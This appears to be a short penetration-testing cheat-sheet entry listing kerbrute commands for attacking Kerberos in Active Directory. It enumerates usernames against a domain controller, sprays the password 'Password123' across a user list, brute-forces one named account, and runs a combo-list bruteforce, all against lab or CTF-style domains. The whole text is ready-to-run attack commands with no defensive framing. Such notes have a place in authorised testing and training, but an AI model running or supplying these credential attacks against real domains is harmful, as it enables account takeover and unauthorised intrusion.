
Using kerbrute bruteforce :
```bash
kerbrute userenum --domain htb.local usernames --dc 10.10.10.4
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
```